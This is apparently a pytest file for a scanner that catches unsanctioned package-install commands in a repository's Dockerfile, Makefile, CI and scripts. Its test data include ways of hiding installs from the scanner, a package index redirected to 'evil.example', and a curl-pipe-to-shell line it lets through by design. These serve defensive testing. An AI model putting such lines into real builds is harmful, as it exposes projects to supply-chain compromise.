"""G4-CP: the allow-listed chokepoint that denies by token (DEP-LOCK-AT, ADDENDUM-1/-2).

G4 catches DRIFT, not a determined adversary. Every test here asserts that an edit
INTRODUCES a violation against a baseline that is itself ``[]`` (gate condition C3), so
hygiene noise cannot mask a GREEN and a RED baseline cannot pass a test by accident.

Determinism (operator rule 2026-10-21): nothing here pins interpreter-formatted text
(``repr``, ``ast.unparse``, exception strings). The assertions are on set membership and
emptiness of the scanner's own messages, which are plain f-strings of this repo.

Run in a worktree with untracked files this module is RED by design (the baseline test
sees the untracked file): the scan includes ``--others --exclude-standard`` (advisory A3).
"""

from __future__ import annotations

import functools
from typing import Any

import pytest

from tests._g4_probe_cases import PROBES
from tests._g4_realfile_forms import FORMS
from tests._g4_sanctioned import ARCHIVES, BINARIES, HASH_PINNED, SANCTIONED
from tests._g4_scan import apply_edit, scan_files, violations

DF_LOCK_OLD = "COPY requirements.txt ."
DF_HASHED = "RUN pip install --user --no-cache-dir --require-hashes --only-binary=:all: -r requirements.txt\n"
CI_SANCTIONED = "        run: bash scripts/install-locked.sh pip\n"
VCS_LINE = '    "audittrace-object-storage @ git+https://github.com/lfdesousa/audittrace-object-storage.git@${SHA}"'


@functools.cache
def real_files() -> dict[str, bytes]:
    return scan_files()


@functools.cache
def baseline() -> tuple[str, ...]:
    return tuple(violations(real_files()))


def assert_baseline_clean() -> None:
    assert baseline() == (), baseline()  # C3: the delta is only meaningful from []


def red(edit: tuple[Any, ...], **kw: Any) -> list[str]:
    """Violations after one in-memory edit of the real tree (baseline asserted clean)."""
    assert_baseline_clean()
    return violations(apply_edit(real_files(), edit), **kw)


# --- the gate's own probe forms (data only; G5/G7/G8/G9/G13/G14/G15/G17 are declared residuals)
GATE_FORMS: dict[str, tuple[Any, ...]] = {
    "G1-sh-continuation-split": (
        "append",
        "scripts/setup.sh",
        "p\\\nip install fastapi",
    ),
    "G2-dockerfile-continuation-split": (
        "append",
        "Dockerfile",
        "RUN p\\\n    ip install fastapi",
    ),
    "G2b-dockerfile-unindented-split": (
        "append",
        "Dockerfile",
        "RUN p\\\nip install fastapi",
    ),
    "G3-make-recipe-continuation-split": (
        "append",
        "Makefile",
        "g3x:\n\tp\\\n\tip install fastapi",
    ),
    "G4-py-string-continuation": (
        "append",
        "scripts/ci/check_venv_matches_lock.py",
        'import subprocess; subprocess.run(["p\\\nip", "install", "fastapi"])',
    ),
    "G6-shebang-sh": (
        "append",
        "scripts/g6.sh",
        "#!/usr/bin/env -S pip install -r\nfastapi",
    ),
    "G10-dockerfile-copy-substitute-lock": (
        "replace",
        "Dockerfile",
        DF_LOCK_OLD,
        "COPY extras.txt requirements.txt",
    ),
    "G11-ci-cp-substitute-lock": (
        "replace",
        ".github/workflows/ci.yml",
        CI_SANCTIONED,
        "        run: cp extras.txt requirements-dev.txt && bash scripts/install-locked.sh pip\n",
    ),
    "G11b-ci-separate-step-substitute-lock": (
        "replace",
        ".github/workflows/ci.yml",
        CI_SANCTIONED,
        "        run: cp extras.txt requirements-dev.txt\n      - name: Install\n        run: bash scripts/install-locked.sh pip\n",
    ),
    "G12-yaml-quoted-escaped-newline": (
        "append",
        ".github/workflows/ci.yml",
        '  g12:\n    runs-on: x\n    steps:\n      - run: "pi\\\n          p install fastapi"',
    ),
    "G16-dup-sanctioned-line": ("append", "Dockerfile", DF_HASHED.rstrip("\n")),
    "G18-non-utf8-setup.sh": (
        "bytes",
        "scripts/setup.sh",
        b"# caf\xe9\n",
        b"pip install fastapi\n",
    ),
    "G19-yaml-plain-continuation-extends-sanctioned": (
        "replace",
        ".github/workflows/ci.yml",
        CI_SANCTIONED,
        CI_SANCTIONED + "          extra\n",
    ),
    "G20-yaml-escaped-newline-shadowed-by-comment": (
        "append",
        ".github/workflows/ci.yml",
        '  g20:\n    runs-on: x\n    steps:\n      # pip install fastapi\n      - run: "pi\\\n          p install fastapi"',
    ),
    "G21-dockerfile-escape-directive": (
        "append",
        "Dockerfile",
        "# escape=`\nRUN p`\nip install fastapi",
    ),
    "G22-new-archive": ("bytes", "charts/extra.tgz", b"\x1f\x8b\x08\x00", b""),
    "G23-sh-comment-continuation-into-code": (
        "append",
        "scripts/setup.sh",
        "# note \\\npip install fastapi",
    ),
}

# (case id, edit): every one must be RED (S6' a-p, plus C1 D1-D4 and pdm).
RED_CASES: dict[str, tuple[Any, ...]] = {
    **{k: v for k, v in GATE_FORMS.items() if k != "G16-dup-sanctioned-line"},
    "b-E5-uv-run-with": (
        "append",
        "scripts/setup.sh",
        "uv run --with fastapi python -c 1",
    ),
    "b-R13-uv-run": ("append", ".github/workflows/ci.yml", "          uv run pytest"),
    "c-M4b-PIP-make-var": ("append", "Makefile", "\t$(PIP) install fastapi"),
    "c-E4-PIP_BIN": ("append", "scripts/setup.sh", '"${PIP_BIN}" install fastapi'),
    "e-trailing-comment": ("append", "scripts/setup.sh", "pip install fastapi  # note"),
    "d4-echo-string-naming-pip-install": (
        "append",
        "scripts/setup.sh",
        'echo "see pip install"',
    ),
    "f-D6-vcs-continuation-extra-target": (
        "replace",
        "Dockerfile",
        VCS_LINE,
        VCS_LINE + " fastapi",
    ),
    "g-N35-yaml-folded": (
        "append",
        ".github/workflows/ci.yml",
        "  n35:\n    runs-on: x\n    steps:\n      - run: >\n          pip install --no-deps --no-build-isolation .\n          fastapi",
    ),
    "g-yaml-x70-escaped-scalar": (
        "append",
        ".github/workflows/ci.yml",
        '  gx70:\n    runs-on: x\n    steps:\n      - run: "\\x70ip install fastapi"',
    ),
    "i-G18b-non-utf8-file-without-sanctioned-line": (
        "bytes",
        "scripts/setup-memory-scopes.sh",
        b"# caf\xe9\n",
        b"pip install fastapi\n",
    ),
    "k-stale-entry-Dockerfile26-deleted": ("replace", "Dockerfile", DF_HASHED, ""),
    "l-NC9-pin-grammar": (
        "append",
        "pyproject.toml",
        '[tool.x]\ndeps = ["pip==26.2.1 --index-url https://evil.example/simple"]',
    ),
    "m-NC10-backend-path": (
        "replace",
        "pyproject.toml",
        'build-backend = "setuptools.build_meta"',
        'build-backend = "setuptools.build_meta"\nbackend-path = ["."]',
    ),
    "n-tox-ini": ("bytes", "scripts/x/tox.ini", b"[testenv]\ndeps = fastapi\n", b""),
    "n-tool-uv": (
        "append",
        "pyproject.toml",
        '[tool.uv]\nindex-url = "https://evil.example/simple"',
    ),
    "p-N5-range-install": (
        "append",
        ".github/workflows/ci.yml",
        '          pip install -e ".[dev]"',
    ),
    "p-N5b-no-deps-stray": (
        "append",
        ".github/workflows/ci.yml",
        "          pip install --no-deps foo==1",
    ),
    # C1: the build front-ends and package managers added to the advisory enumeration
    "C1-D1-Makefile-python-m-build": (
        "append",
        "Makefile",
        "d1x:\n\t$(PYTHON) -m build",
    ),
    "C1-D2-CI-step-python-m-build": (
        "append",
        ".github/workflows/ci.yml",
        "      - run: python -m build --no-isolation",
    ),
    "C1-D3-venv-upgrade-deps": (
        "append",
        "scripts/setup.sh",
        "python3 -m venv --upgrade-deps .venv2",
    ),
    "C1-D4-Dockerfile-python-m-build": ("append", "Dockerfile", "RUN python -m build"),
    "C1-pyproject-build": ("append", "scripts/setup.sh", "pyproject-build ."),
    "C1-pdm-install": ("append", "scripts/setup.sh", "pdm install"),
    "C1-mamba": ("append", "scripts/setup.sh", "micromamba install -y numpy"),
}


@pytest.mark.parametrize("edit", RED_CASES.values(), ids=list(RED_CASES))
def test_each_drift_form_introduces_a_violation(edit: tuple[Any, ...]) -> None:
    assert red(edit), edit[:2]


@pytest.mark.parametrize("name", sorted(FORMS))
def test_every_r1_r3_real_file_form_is_red(name: str) -> None:
    """(b) The 28 real-file forms of reviews r1-r3, applied in memory to the real files."""
    assert red(FORMS[name]), name


@pytest.mark.parametrize("probe", PROBES, ids=[p[0] for p in PROBES])
def test_every_r2_r3_probe_statement_is_red_alone(probe: tuple[str, str, str]) -> None:
    """(c) The 94 probe statements as synthetic files, judged with an EMPTY allow list."""
    assert_baseline_clean()
    _, rel, text = probe
    assert violations(
        {rel: text.encode()}, sanctioned=frozenset(), pinned={}, archives={}
    )


def test_the_real_tree_has_zero_violations() -> None:
    """(a) RED in a worktree with untracked files; GREEN in a clean clone (C6)."""
    assert_baseline_clean()


def test_the_scan_reaches_the_expected_file_set() -> None:
    files = real_files()
    assert len(files) > 500
    for rel in (
        "Dockerfile",
        "Makefile",
        ".github/workflows/ci.yml",
        "scripts/setup.sh",
    ):
        assert rel in files
    assert not any(rel.startswith(("tests/", "docs/", "istio-")) for rel in files)
    assert set(HASH_PINNED) <= set(files)
    assert set(ARCHIVES) <= set(files)
    assert set(BINARIES) <= set(
        files
    )  # an entry for a vanished binary would be a dead allowance


# ------------------------------------------------------------------ controls that stay GREEN
def test_d3_a_comment_line_naming_pip_install_is_exempt() -> None:
    assert_baseline_clean()
    edit = ("append", "scripts/setup.sh", "# pip install fastapi")
    assert violations(apply_edit(real_files(), edit)) == []


def test_q_d5_a_token_free_curl_pipe_sh_is_green_by_design() -> None:
    """DECLARED RESIDUAL (ADR-065 class 2): G4 denies tokens, not behaviour."""
    assert_baseline_clean()
    edit = ("append", "Dockerfile", "RUN curl -sSf https://example.invalid/x.sh | sh")
    assert violations(apply_edit(real_files(), edit)) == []


def test_a_clean_synthetic_file_is_green() -> None:
    assert_baseline_clean()
    assert (
        violations(
            {"scripts/ok.sh": b"echo hello\n"},
            sanctioned=frozenset(),
            pinned={},
            archives={},
        )
        == []
    )


# ------------------------------------------------------------------ the chokepoint pins and the allow list
def test_nc2_one_byte_in_a_hash_pinned_chokepoint_is_red() -> None:
    assert_baseline_clean()
    for rel in HASH_PINNED:
        files = {**real_files(), rel: real_files()[rel] + b"\n"}
        assert any("differs from its pinned sha256" in v for v in violations(files)), (
            rel
        )


def test_nc1_dropping_one_sanctioned_entry_is_red() -> None:
    assert_baseline_clean()
    entry = next(
        e
        for e in SANCTIONED
        if e[0] == "Dockerfile"
        and "-r requirements.txt" in e[1]
        and "pip install" in e[1]
    )
    assert violations(real_files(), sanctioned=SANCTIONED - {entry})


def test_k_a_duplicate_sanctioned_line_is_red() -> None:
    assert_baseline_clean()
    got = red(GATE_FORMS["G16-dup-sanctioned-line"])
    assert any("duplicate sanctioned line" in v for v in got), got


def test_k_a_stale_entry_is_red() -> None:
    got = red(RED_CASES["k-stale-entry-Dockerfile26-deleted"])
    assert any("stale SANCTIONED entry" in v for v in got), got


def test_k_a_padded_entry_without_a_token_is_red() -> None:
    assert_baseline_clean()
    padded = ("Dockerfile", "FROM python:3.12-slim AS builder")
    assert (
        padded[1] in real_files()["Dockerfile"].decode()
    )  # the padding line really exists
    got = violations(real_files(), sanctioned=SANCTIONED | {padded})
    assert any("vacuous entry" in v for v in got), got


def test_a_pinned_file_missing_from_the_tree_is_red() -> None:
    assert_baseline_clean()
    files = {k: v for k, v in real_files().items() if k != "scripts/lock.sh"}
    assert any("HASH_PINNED file is missing" in v for v in violations(files))


def test_a_new_unpinned_archive_and_a_changed_pinned_archive_are_red() -> None:
    assert_baseline_clean()
    pinned = next(iter(ARCHIVES))
    changed = {**real_files(), pinned: real_files()[pinned] + b"x"}
    assert any("not pinned by path and sha256" in v for v in violations(changed))
    assert any("not pinned" in v for v in red(GATE_FORMS["G22-new-archive"]))


def test_a_non_utf8_file_is_never_dropped_silently() -> None:
    got = red(GATE_FORMS["G18-non-utf8-setup.sh"])
    assert got  # S4' (stale entry) or the binary list: either way not silent
    got = red(RED_CASES["i-G18b-non-utf8-file-without-sanctioned-line"])
    assert any("undecodable file is not in the binary allow list" in v for v in got), (
        got
    )


def test_a_shebang_line_is_never_comment_exempt() -> None:
    got = red(GATE_FORMS["G6-shebang-sh"])
    assert any("scripts/g6.sh" in v for v in got), got


def test_a_python_comment_token_is_exempt_but_a_string_is_not() -> None:
    files = {
        "a.py": b"# pip install x\n",
        "b.py": b'x = "pip install x"\n',
        "c.py": b"x = 1  # pip install x\n",
    }
    got = violations(files, sanctioned=frozenset(), pinned={}, archives={})
    assert not any(v.startswith("a.py") for v in got)
    assert any(v.startswith("b.py") for v in got)
    assert not any(v.startswith("c.py") for v in got)


def test_the_installer_name_list_is_an_enumeration_hatch_is_not_in_it() -> None:
    """C1: `hatch` is deliberately NOT a token ("escape hatch" appears in ten files)."""
    files = {"a.sh": b"hatch build\nthis is an escape hatch\n"}
    assert violations(files, sanctioned=frozenset(), pinned={}, archives={}) == []
